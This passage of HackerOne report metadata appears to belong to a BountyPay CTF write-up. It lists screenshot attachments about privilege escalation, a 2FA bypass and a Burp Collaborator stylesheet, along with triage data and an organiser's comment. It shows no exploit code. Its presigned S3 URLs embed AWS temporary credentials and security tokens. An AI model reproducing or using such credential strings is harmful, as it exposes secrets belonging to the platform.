i77DW4gUN5GnzWQsten34H99dGqb8t6pYxCQN%2F8DKWHJ%2BalzRH5DiTjmpYvgNaPu2xwo%2F6Zr8S4tdff1lzr%2BcSt%2FZceeJJnqd2Z9QEAJO7SqjLAnxMOiEuHPHYVOEZ3kfA%2B%2Bbt34tKfFC8MGX%2BXh1zYwal1wOrSP2k%2FZSlC9lsLebNN7Iooim1lSpjw7Du5GV89O7g%2F7rGROCUF%2B%2BB24LrVSbZTIggbHns1VxsRvSvZGmJHi7XvmhECvDwu9WmRNJs7XWIMzDD0fOHc22lsbafqmlkdZqwRzJhStehJfZCskFpe6v4wdnRFJqrnSW1n3s9Cn28vHMBxxweBr72n7tIeDBX4PMTrrfy%2B5OhLDCrxYOtKZndzmZHfMzTm0b0uMHvqjv6rofYcR42du%2BPYJ87HhllMZGstEyOaYDwXJ6mUAWqgFU1cRtr5KgJU%2BjBFYZrWtE%2BoZkvuXgEXg40jlw%2BeRQEreWMOGKkYsGOqYBYdUdmtOC7YWorffY3XWIt13STuNB47ZWJ85D8q%2F8hMPTVw3x9BFRZcvFy7ieSMolt4GYUK%2F8moEzkTt%2FanjYuLBUJFMJFunxOEvaMPJA128lGEkS1qX60D7%2BiOofrwvOesADqaqm%2FmYvf6HgURng7sqkiLxzy3mjSpM33Soz6mVH2tmMNYspiP4BF%2BNbXdXLCjYBsB98ENZjOy3b4d4U9P8NkvkUag%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=56256631534c8434db00a37eec9587cb1ca96ad8e1d00d503b54d09c2ec815fc","file_size":14039,"type":"image/png"},{"id":862914,"file_name":"android-part-one-activity.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/fnyuUtasRm6P3QtR6W34uEDW?response-content-disposition=attachment%3B%20filename%3D%22android-part-one-activity.png%22%3B%20filename%2A%3DUTF-8%27%27android-part-one-activity.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSWVBQGJF%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153940Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIDKFbNpVUzrOPbUQYjhN4DgAxVU5%2FXEKmVfjCMWb%2BNkIAiABDuahSBdMUCytEahxX048K6jzH7PGdOzEr8bjHNv10CqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMFF93LkCZvrkmcBNoKtcDT4JSiF4LJ9dMlVWVXz6ozMkun%2BZIV%2FnNB6qVpNI4VDOdAc06QNZffMvjZwfupMjaAHpuIYcvqlkda6prO9SWrglyS6NCrBHv2gaT40jgHA6ufjwtH7OxGYsx039h%2Bh8lmcb39NUtDqetz1GDVn0P%2BUNi77DW4gUN5GnzWQsten34H99dGqb8t6pYxCQN%2F8DKWHJ%2BalzRH5DiTjmpYvgNaPu2xwo%2F6Zr8S4tdff1lzr%2BcSt%2FZceeJJnqd2Z9QEAJO7SqjLAnxMOiEuHPHYVOEZ3kfA%2B%2Bbt34tKfFC8MGX%2BXh1zYwal1wOrSP2k%2FZSlC9lsLebNN7Iooim1lSpjw7Du5GV89O7g%2F7rGROCUF%2B%2BB24LrVSbZTIggbHns1VxsRvSvZGmJHi7XvmhECvDwu9WmRNJs7XWIMzDD0fOHc22lsbafqmlkdZqwRzJhStehJfZCskFpe6v4wdnRFJqrnSW1n3s9Cn28vHMBxxweBr72n7tIeDBX4PMTrrfy%2B5OhLDCrxYOtKZndzmZHfMzTm0b0uMHvqjv6rofYcR42du%2BPYJ87HhllMZGstEyOaYDwXJ6mUAWqgFU1cRtr5KgJU%2BjBFYZrWtE%2BoZkvuXgEXg40jlw%2BeRQEreWMOGKkYsGOqYBYdUdmtOC7YWorffY3XWIt13STuNB47ZWJ85D8q%2F8hMPTVw3x9BFRZcvFy7ieSMolt4GYUK%2F8moEzkTt%2FanjYuLBUJFMJFunxOEvaMPJA128lGEkS1qX60D7%2BiOofrwvOesADqaqm%2FmYvf6HgURng7sqkiLxzy3mjSpM33Soz6mVH2tmMNYspiP4BF%2BNbXdXLCjYBsB98ENZjOy3b4d4U9P8NkvkUag%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=5ac8e0d6db3a852f0990a0c7190263c9ceef317e5a052e7aa24e85023f6200c3","file_size":57420,"type":"image/png"},{"id":862915,"file_name":"android-part-two-activity.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/iya7Dx8ZbbrqwY7h9AjX9bNm?response-content-disposition=attachment%3B%20filename%3D%22android-part-two-activity.png%22%3B%20filename%2A%3DUTF-8%27%27android-part-two-activity.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSWVBQGJF%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153940Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIDKFbNpVUzrOPbUQYjhN4DgAxVU5%2FXEKmVfjCMWb%2BNkIAiABDuahSBdMUCytEahxX048K6jzH7PGdOzEr8bjHNv10CqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMFF93LkCZvrkmcBNoKtcDT4JSiF4LJ9dMlVWVXz6ozMkun%2BZIV%2FnNB6qVpNI4VDOdAc06QNZffMvjZwfupMjaAHpuIYcvqlkda6prO9SWrglyS6NCrBHv2gaT40jgHA6ufjwtH7OxGYsx039h%2Bh8lmcb39NUtDqetz1GDVn0P%2BUNi77DW4gUN5GnzWQsten34H99dGqb8t6pYxCQN%2F8DKWHJ%2BalzRH5DiTjmpYvgNaPu2xwo%2F6Zr8S4tdff1lzr%2BcSt%2FZceeJJnqd2Z9QEAJO7SqjLAnxMOiEuHPHYVOEZ3kfA%2B%2Bbt34tKfFC8MGX%2BXh1zYwal1wOrSP2k%2FZSlC9lsLebNN7Iooim1lSpjw7Du5GV89O7g%2F7rGROCUF%2B%2BB24LrVSbZTIggbHns1VxsRvSvZGmJHi7XvmhECvDwu9WmRNJs7XWIMzDD0fOHc22lsbafqmlkdZqwRzJhStehJfZCskFpe6v4wdnRFJqrnSW1n3s9Cn28vHMBxxweBr72n7tIeDBX4PMTrrfy%2B5OhLDCrxYOtKZndzmZHfMzTm0b0uMHvqjv6rofYcR42du%2BPYJ87HhllMZGstEyOaYDwXJ6mUAWqgFU1cRtr5KgJU%2BjBFYZrWtE%2BoZkvuXgEXg40jlw%2BeRQEreWMOGKkYsGOqYBYdUdmtOC7YWorffY3XWIt13STuNB47ZWJ85D8q%2F8hMPTVw3x9BFRZcvFy7ieSMolt4GYUK%2F8moEzkTt%2FanjYuLBUJFMJFunxOEvaMPJA128lGEkS1qX60D7%2BiOofrwvOesADqaqm%2FmYvf6HgURng7sqkiLxzy3mjSpM33Soz6mVH2tmMNYspiP4BF%2BNbXdXLCjYBsB98ENZjOy3b4d4U9P8NkvkUag%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=d9ee13c324fb904b0009534fcbbf58fa5802928ab5444dd0243a5bebbef218a8","file_size":65921,"type":"image/png"},{"id":862959,"file_name":"android-part-three-activity.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/KAFhAWT7hakjCnYnycQ85yM8?response-content-disposition=attachment%3B%20filename%3D%22android-part-three-activity.png%22%3B%20filename%2A%3DUTF-8%27%27android-part-three-activity.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSWVBQGJF%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153940Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIDKFbNpVUzrOPbUQYjhN4DgAxVU5%2FXEKmVfjCMWb%2BNkIAiABDuahSBdMUCytEahxX048K6jzH7PGdOzEr8bjHNv10CqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMFF93LkCZvrkmcBNoKtcDT4JSiF4LJ9dMlVWVXz6ozMkun%2BZIV%2FnNB6qVpNI4VDOdAc06QNZffMvjZwfupMjaAHpuIYcvqlkda6prO9SWrglyS6NCrBHv2gaT40jgHA6ufjwtH7OxGYsx039h%2Bh8lmcb39NUtDqetz1GDVn0P%2BUNi77DW4gUN5GnzWQsten34H99dGqb8t6pYxCQN%2F8DKWHJ%2BalzRH5DiTjmpYvgNaPu2xwo%2F6Zr8S4tdff1lzr%2BcSt%2FZceeJJnqd2Z9QEAJO7SqjLAnxMOiEuHPHYVOEZ3kfA%2B%2Bbt34tKfFC8MGX%2BXh1zYwal1wOrSP2k%2FZSlC9lsLebNN7Iooim1lSpjw7Du5GV89O7g%2F7rGROCUF%2B%2BB24LrVSbZTIggbHns1VxsRvSvZGmJHi7XvmhECvDwu9WmRNJs7XWIMzDD0fOHc22lsbafqmlkdZqwRzJhStehJfZCskFpe6v4wdnRFJqrnSW1n3s9Cn28vHMBxxweBr72n7tIeDBX4PMTrrfy%2B5OhLDCrxYOtKZndzmZHfMzTm0b0uMHvqjv6rofYcR42du%2BPYJ87HhllMZGstEyOaYDwXJ6mUAWqgFU1cRtr5KgJU%2BjBFYZrWtE%2BoZkvuXgEXg40jlw%2BeRQEreWMOGKkYsGOqYBYdUdmtOC7YWorffY3XWIt13STuNB47ZWJ85D8q%2F8hMPTVw3x9BFRZcvFy7ieSMolt4GYUK%2F8moEzkTt%2FanjYuLBUJFMJFunxOEvaMPJA128lGEkS1qX60D7%2BiOofrwvOesADqaqm%2FmYvf6HgURng7sqkiLxzy3mjSpM33Soz6mVH2tmMNYspiP4BF%2BNbXdXLCjYBsB98ENZjOy3b4d4U9P8NkvkUag%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=3c55bcf2d1eb32d3608f27351284e14c6b47ae1a9f04fe62d98976f81ef50ba7","file_size":62324,"type":"image/png"},{"id":862964,"file_name":"android-congrats-activity.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/VojQm8VZuCVLWcwW8T9PNZGn?response-content-disposition=attachment%3B%20filename%3D%22android-congrats-activity.png%22%3B%20filename%2A%3DUTF-8%27%27android-congrats-activity.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSWVBQGJF%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153940Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIDKFbNpVUzrOPbUQYjhN4DgAxVU5%2FXEKmVfjCMWb%2BNkIAiABDuahSBdMUCytEahxX048K6jzH7PGdOzEr8bjHNv10CqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMFF93LkCZvrkmcBNoKtcDT4JSiF4LJ9dMlVWVXz6ozMkun%2BZIV%2FnNB6qVpNI4VDOdAc06QNZffMvjZwfupMjaAHpuIYcvqlkda6prO9SWrglyS6NCrBHv2gaT40jgHA6ufjwtH7OxGYsx039h%2Bh8lmcb39NUtDqetz1GDVn0P%2BUNi77DW4gUN5GnzWQsten34H99dGqb8t6pYxCQN%2F8DKWHJ%2BalzRH5DiTjmpYvgNaPu2xwo%2F6Zr8S4tdff1lzr%2BcSt%2FZceeJJnqd2Z9QEAJO7SqjLAnxMOiEuHPHYVOEZ3kfA%2B%2Bbt34tKfFC8MGX%2BXh1zYwal1wOrSP2k%2FZSlC9lsLebNN7Iooim1lSpjw7Du5GV89O7g%2F7rGROCUF%2B%2BB24LrVSbZTIggbHns1VxsRvSvZGmJHi7XvmhECvDwu9WmRNJs7XWIMzDD0fOHc22lsbafqmlkdZqwRzJhStehJfZCskFpe6v4wdnRFJqrnSW1n3s9Cn28vHMBxxweBr72n7tIeDBX4PMTrrfy%2B5OhLDCrxYOtKZndzmZHfMzTm0b0uMHvqjv6rofYcR42du%2BPYJ87HhllMZGstEyOaYDwXJ6mUAWqgFU1cRtr5KgJU%2BjBFYZrWtE%2BoZkvuXgEXg40jlw%2BeRQEreWMOGKkYsGOqYBYdUdmtOC7YWorffY3XWIt13STuNB47ZWJ85D8q%2F8hMPTVw3x9BFRZcvFy7ieSMolt4GYUK%2F8moEzkTt%2FanjYuLBUJFMJFunxOEvaMPJA128lGEkS1qX60D7%2BiOofrwvOesADqaqm%2FmYvf6HgURng7sqkiLxzy3mjSpM33Soz6mVH2tmMNYspiP4BF%2BNbXdXLCjYBsB98ENZjOy3b4d4U9P8NkvkUag%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=18ef79f80418e546bcc5ab5ab0cb8e7229d475285aa950e6049fe1297a9cded4","file_size":80181,"type":"image/png"},{"id":863165,"file_name":"completed-priv-esc.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/JhZy42jGednjJPbk1xvzuttL?response-content-disposition=attachment%3B%20filename%3D%22completed-priv-esc.png%22%3B%20filename%2A%3DUTF-8%27%27completed-priv-esc.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSWVBQGJF%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153940Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIDKFbNpVUzrOPbUQYjhN4DgAxVU5%2FXEKmVfjCMWb%2BNkIAiABDuahSBdMUCytEahxX048K6jzH7PGdOzEr8bjHNv10CqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMFF93LkCZvrkmcBNoKtcDT4JSiF4LJ9dMlVWVXz6ozMkun%2BZIV%2FnNB6qVpNI4VDOdAc06QNZffMvjZwfupMjaAHpuIYcvqlkda6prO9SWrglyS6NCrBHv2gaT40jgHA6ufjwtH7OxGYsx039h%2Bh8lmcb39NUtDqetz1GDVn0P%2BUNi77DW4gUN5GnzWQsten34H99dGqb8t6pYxCQN%2F8DKWHJ%2BalzRH5DiTjmpYvgNaPu2xwo%2F6Zr8S4tdff1lzr%2BcSt%2FZceeJJnqd2Z9QEAJO7SqjLAnxMOiEuHPHYVOEZ3kfA%2B%2Bbt34tKfFC8MGX%2BXh1zYwal1wOrSP2k%2FZSlC9lsLebNN7Iooim1lSpjw7Du5GV89O7g%2F7rGROCUF%2B%2BB24LrVSbZTIggbHns1VxsRvSvZGmJHi7XvmhECvDwu9WmRNJs7XWIMzDD0fOHc22lsbafqmlkdZqwRzJhStehJfZCskFpe6v4wdnRFJqrnSW1n3s9Cn28vHMBxxweBr72n7tIeDBX4PMTrrfy%2B5OhLDCrxYOtKZndzmZHfMzTm0b0uMHvqjv6rofYcR42du%2BPYJ87HhllMZGstEyOaYDwXJ6mUAWqgFU1cRtr5KgJU%2BjBFYZrWtE%2BoZkvuXgEXg40jlw%2BeRQEreWMOGKkYsGOqYBYdUdmtOC7YWorffY3XWIt13STuNB47ZWJ85D8q%2F8hMPTVw3x9BFRZcvFy7ieSMolt4GYUK%2F8moEzkTt%2FanjYuLBUJFMJFunxOEvaMPJA128lGEkS1qX60D7%2BiOofrwvOesADqaqm%2FmYvf6HgURng7sqkiLxzy3mjSpM33Soz6mVH2tmMNYspiP4BF%2BNbXdXLCjYBsB98ENZjOy3b4d4U9P8NkvkUag%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=eeea525e972aaee83a803ecce35044140a8378c4e8d06b80059b00b993e319b9","file_size":11280,"type":"image/png"},{"id":863225,"file_name":"may-transactions-to-process.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/hS9qyX8uUeRFcS5EvCtcc375?response-content-disposition=attachment%3B%20filename%3D%22may-transactions-to-process.png%22%3B%20filename%2A%3DUTF-8%27%27may-transactions-to-process.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSWVBQGJF%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153940Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIDKFbNpVUzrOPbUQYjhN4DgAxVU5%2FXEKmVfjCMWb%2BNkIAiABDuahSBdMUCytEahxX048K6jzH7PGdOzEr8bjHNv10CqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMFF93LkCZvrkmcBNoKtcDT4JSiF4LJ9dMlVWVXz6ozMkun%2BZIV%2FnNB6qVpNI4VDOdAc06QNZffMvjZwfupMjaAHpuIYcvqlkda6prO9SWrglyS6NCrBHv2gaT40jgHA6ufjwtH7OxGYsx039h%2Bh8lmcb39NUtDqetz1GDVn0P%2BUNi77DW4gUN5GnzWQsten34H99dGqb8t6pYxCQN%2F8DKWHJ%2BalzRH5DiTjmpYvgNaPu2xwo%2F6Zr8S4tdff1lzr%2BcSt%2FZceeJJnqd2Z9QEAJO7SqjLAnxMOiEuHPHYVOEZ3kfA%2B%2Bbt34tKfFC8MGX%2BXh1zYwal1wOrSP2k%2FZSlC9lsLebNN7Iooim1lSpjw7Du5GV89O7g%2F7rGROCUF%2B%2BB24LrVSbZTIggbHns1VxsRvSvZGmJHi7XvmhECvDwu9WmRNJs7XWIMzDD0fOHc22lsbafqmlkdZqwRzJhStehJfZCskFpe6v4wdnRFJqrnSW1n3s9Cn28vHMBxxweBr72n7tIeDBX4PMTrrfy%2B5OhLDCrxYOtKZndzmZHfMzTm0b0uMHvqjv6rofYcR42du%2BPYJ87HhllMZGstEyOaYDwXJ6mUAWqgFU1cRtr5KgJU%2BjBFYZrWtE%2BoZkvuXgEXg40jlw%2BeRQEreWMOGKkYsGOqYBYdUdmtOC7YWorffY3XWIt13STuNB47ZWJ85D8q%2F8hMPTVw3x9BFRZcvFy7ieSMolt4GYUK%2F8moEzkTt%2FanjYuLBUJFMJFunxOEvaMPJA128lGEkS1qX60D7%2BiOofrwvOesADqaqm%2FmYvf6HgURng7sqkiLxzy3mjSpM33Soz6mVH2tmMNYspiP4BF%2BNbXdXLCjYBsB98ENZjOy3b4d4U9P8NkvkUag%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=f103496ce44023d124d9dec6f2535af1441840b873b3004e6b2a2a4f8e5cc8a3","file_size":9656,"type":"image/png"},{"id":863226,"file_name":"transaction-approval-2fa-page.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/HKGUFNAMo9dJX8UG6qm1TW2o?response-content-disposition=attachment%3B%20filename%3D%22transaction-approval-2fa-page.png%22%3B%20filename%2A%3DUTF-8%27%27transaction-approval-2fa-page.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSWVBQGJF%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153940Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIDKFbNpVUzrOPbUQYjhN4DgAxVU5%2FXEKmVfjCMWb%2BNkIAiABDuahSBdMUCytEahxX048K6jzH7PGdOzEr8bjHNv10CqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMFF93LkCZvrkmcBNoKtcDT4JSiF4LJ9dMlVWVXz6ozMkun%2BZIV%2FnNB6qVpNI4VDOdAc06QNZffMvjZwfupMjaAHpuIYcvqlkda6prO9SWrglyS6NCrBHv2gaT40jgHA6ufjwtH7OxGYsx039h%2Bh8lmcb39NUtDqetz1GDVn0P%2BUNi77DW4gUN5GnzWQsten34H99dGqb8t6pYxCQN%2F8DKWHJ%2BalzRH5DiTjmpYvgNaPu2xwo%2F6Zr8S4tdff1lzr%2BcSt%2FZceeJJnqd2Z9QEAJO7SqjLAnxMOiEuHPHYVOEZ3kfA%2B%2Bbt34tKfFC8MGX%2BXh1zYwal1wOrSP2k%2FZSlC9lsLebNN7Iooim1lSpjw7Du5GV89O7g%2F7rGROCUF%2B%2BB24LrVSbZTIggbHns1VxsRvSvZGmJHi7XvmhECvDwu9WmRNJs7XWIMzDD0fOHc22lsbafqmlkdZqwRzJhStehJfZCskFpe6v4wdnRFJqrnSW1n3s9Cn28vHMBxxweBr72n7tIeDBX4PMTrrfy%2B5OhLDCrxYOtKZndzmZHfMzTm0b0uMHvqjv6rofYcR42du%2BPYJ87HhllMZGstEyOaYDwXJ6mUAWqgFU1cRtr5KgJU%2BjBFYZrWtE%2BoZkvuXgEXg40jlw%2BeRQEreWMOGKkYsGOqYBYdUdmtOC7YWorffY3XWIt13STuNB47ZWJ85D8q%2F8hMPTVw3x9BFRZcvFy7ieSMolt4GYUK%2F8moEzkTt%2FanjYuLBUJFMJFunxOEvaMPJA128lGEkS1qX60D7%2BiOofrwvOesADqaqm%2FmYvf6HgURng7sqkiLxzy3mjSpM33Soz6mVH2tmMNYspiP4BF%2BNbXdXLCjYBsB98ENZjOy3b4d4U9P8NkvkUag%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=52a46cad87bbfa38bf964a23f06e755b9a006de0745746e0ca6570ffa1c34f66","file_size":11213,"type":"image/png"},{"id":863231,"file_name":"external-stylesheet-burp-collaborator.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/TyQZ5bav5NEXxkKPZMzdgJNh?response-content-disposition=attachment%3B%20filename%3D%22external-stylesheet-burp-collaborator.png%22%3B%20filename%2A%3DUTF-8%27%27external-stylesheet-burp-collaborator.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSWVBQGJF%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153940Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIDKFbNpVUzrOPbUQYjhN4DgAxVU5%2FXEKmVfjCMWb%2BNkIAiABDuahSBdMUCytEahxX048K6jzH7PGdOzEr8bjHNv10CqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMFF93LkCZvrkmcBNoKtcDT4JSiF4LJ9dMlVWVXz6ozMkun%2BZIV%2FnNB6qVpNI4VDOdAc06QNZffMvjZwfupMjaAHpuIYcvqlkda6prO9SWrglyS6NCrBHv2gaT40jgHA6ufjwtH7OxGYsx039h%2Bh8lmcb39NUtDqetz1GDVn0P%2BUNi77DW4gUN5GnzWQsten34H99dGqb8t6pYxCQN%2F8DKWHJ%2BalzRH5DiTjmpYvgNaPu2xwo%2F6Zr8S4tdff1lzr%2BcSt%2FZceeJJnqd2Z9QEAJO7SqjLAnxMOiEuHPHYVOEZ3kfA%2B%2Bbt34tKfFC8MGX%2BXh1zYwal1wOrSP2k%2FZSlC9lsLebNN7Iooim1lSpjw7Du5GV89O7g%2F7rGROCUF%2B%2BB24LrVSbZTIggbHns1VxsRvSvZGmJHi7XvmhECvDwu9WmRNJs7XWIMzDD0fOHc22lsbafqmlkdZqwRzJhStehJfZCskFpe6v4wdnRFJqrnSW1n3s9Cn28vHMBxxweBr72n7tIeDBX4PMTrrfy%2B5OhLDCrxYOtKZndzmZHfMzTm0b0uMHvqjv6rofYcR42du%2BPYJ87HhllMZGstEyOaYDwXJ6mUAWqgFU1cRtr5KgJU%2BjBFYZrWtE%2BoZkvuXgEXg40jlw%2BeRQEreWMOGKkYsGOqYBYdUdmtOC7YWorffY3XWIt13STuNB47ZWJ85D8q%2F8hMPTVw3x9BFRZcvFy7ieSMolt4GYUK%2F8moEzkTt%2FanjYuLBUJFMJFunxOEvaMPJA128lGEkS1qX60D7%2BiOofrwvOesADqaqm%2FmYvf6HgURng7sqkiLxzy3mjSpM33Soz6mVH2tmMNYspiP4BF%2BNbXdXLCjYBsB98ENZjOy3b4d4U9P8NkvkUag%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=e62baae75499f59e4d8a8e3d4da9086bb2d8cd913909ca68d273de0ca6ffbf28","file_size":32650,"type":"image/png"},{"id":863338,"file_name":"flag.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/jyrYkpDdcDErnCQircXhG1p8?response-content-disposition=attachment%3B%20filename%3D%22flag.png%22%3B%20filename%2A%3DUTF-8%27%27flag.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSWVBQGJF%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153940Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIDKFbNpVUzrOPbUQYjhN4DgAxVU5%2FXEKmVfjCMWb%2BNkIAiABDuahSBdMUCytEahxX048K6jzH7PGdOzEr8bjHNv10CqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMFF93LkCZvrkmcBNoKtcDT4JSiF4LJ9dMlVWVXz6ozMkun%2BZIV%2FnNB6qVpNI4VDOdAc06QNZffMvjZwfupMjaAHpuIYcvqlkda6prO9SWrglyS6NCrBHv2gaT40jgHA6ufjwtH7OxGYsx039h%2Bh8lmcb39NUtDqetz1GDVn0P%2BUNi77DW4gUN5GnzWQsten34H99dGqb8t6pYxCQN%2F8DKWHJ%2BalzRH5DiTjmpYvgNaPu2xwo%2F6Zr8S4tdff1lzr%2BcSt%2FZceeJJnqd2Z9QEAJO7SqjLAnxMOiEuHPHYVOEZ3kfA%2B%2Bbt34tKfFC8MGX%2BXh1zYwal1wOrSP2k%2FZSlC9lsLebNN7Iooim1lSpjw7Du5GV89O7g%2F7rGROCUF%2B%2BB24LrVSbZTIggbHns1VxsRvSvZGmJHi7XvmhECvDwu9WmRNJs7XWIMzDD0fOHc22lsbafqmlkdZqwRzJhStehJfZCskFpe6v4wdnRFJqrnSW1n3s9Cn28vHMBxxweBr72n7tIeDBX4PMTrrfy%2B5OhLDCrxYOtKZndzmZHfMzTm0b0uMHvqjv6rofYcR42du%2BPYJ87HhllMZGstEyOaYDwXJ6mUAWqgFU1cRtr5KgJU%2BjBFYZrWtE%2BoZkvuXgEXg40jlw%2BeRQEreWMOGKkYsGOqYBYdUdmtOC7YWorffY3XWIt13STuNB47ZWJ85D8q%2F8hMPTVw3x9BFRZcvFy7ieSMolt4GYUK%2F8moEzkTt%2FanjYuLBUJFMJFunxOEvaMPJA128lGEkS1qX60D7%2BiOofrwvOesADqaqm%2FmYvf6HgURng7sqkiLxzy3mjSpM33Soz6mVH2tmMNYspiP4BF%2BNbXdXLCjYBsB98ENZjOy3b4d4U9P8NkvkUag%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=d9338ea93c9533c370e2906d8567c22dd7ab046594230e8847648b46ed2941d3","file_size":16564,"type":"image/png"}],"allow_singular_disclosure_at":"2020-07-19T18:01:39.140Z","allow_singular_disclosure_after":-38785081.66636696,"singular_disclosure_allowed":true,"vote_count":10,"voters":["njbooher","nytr0gen","nagli","fizhimchik","amad3u6","zerboa","pacmanx","b69fb2ebda43240ece9dbeb","ziggystardust","tarsira"],"severity":{"rating":"critical","author_type":"User"},"structured_scope":{"databaseId":48138,"asset_type":"URL","asset_identifier":"*.bountypay.h1ctf.com","max_severity":"none"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":8267287,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","automated_response":false,"created_at":"2020-06-11T19:39:43.432Z","updated_at":"2020-06-11T19:39:43.432Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":8268303,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello,\n\nI wanted to personally thank you for participating in the #h12006 2020 CTF, I hope you enjoyed the challenge! We received tons of great submission and it definitely made our decision a lot harder than we excepted. Unfortunately, since we only have a limited number of invites available, your write up was not selected for this event. We appreciate your hard work and we hope to see you participate in our next CTF!\n\nWe will send you a request to publicly disclose your submissions next week, so please hold on to your writeups, we'll make sure to let you know when you can publish them on your 